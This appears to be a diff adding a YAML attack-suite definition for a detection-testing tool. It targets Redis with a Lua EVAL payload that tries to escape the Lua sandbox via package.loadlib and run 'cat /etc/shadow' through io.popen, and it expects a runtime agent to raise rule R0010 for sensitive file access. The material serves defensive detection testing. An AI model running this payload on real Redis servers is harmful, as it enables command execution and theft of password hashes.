@@ -1,0 +1,41 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-attack-03-read-etc-shadow
+  description: >-
+    Attempt to read /etc/shadow via Lua sandbox escape. Even though the redis
+    user cannot read shadow (permission denied), the open() syscall is
+    intercepted by node-agent and triggers R0010.
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+attacks:
+  - name: read-etc-shadow
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return 'sandbox_blocked' end
+        local f = io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted')
+        local out = f:read('*a')
+        f:close()
+        return 'shadow:' .. out
+    successIndicators:
+      - responseContains: "shadow_attempted"
+expectedDetections:
+  - attackType: fileless
+    ruleID: R0010
+    ruleName: "Unexpected Sensitive File Access"
+    containerName: redis
+    command: cat
